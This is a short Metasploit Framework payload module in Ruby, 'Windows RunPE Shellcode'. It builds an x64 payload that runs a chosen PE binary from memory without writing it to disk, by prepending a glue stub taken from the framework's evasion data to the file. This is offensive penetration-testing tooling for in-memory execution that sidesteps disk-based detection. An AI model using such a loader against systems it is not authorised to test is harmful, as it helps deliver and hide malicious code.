# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 353

  include Msf::Payload::Single
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows RunPE Shellcode',
        'Description' => 'Executes a PE binary from memory without writing to disk.',
        'Author' => 'Diego Ledda',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64
      ),
    )
    register_options([
      OptString.new('FILE', [true, 'Path to the PE file to execute from memory'])
    ])
  end

  def generate(_opts = {})
    glue = File.join(Msf::Config.data_directory, 'evasion', 'glue', 'windows', 'x64', 'exe_to_shellcode.bin')
    file = File.readable?(datastore['FILE']) ? datastore['FILE'] : (raise "File #{datastore['FILE']} does not exist or is not readable!")
    payload = File.read(glue) + File.read(file)
    return payload
  end
end
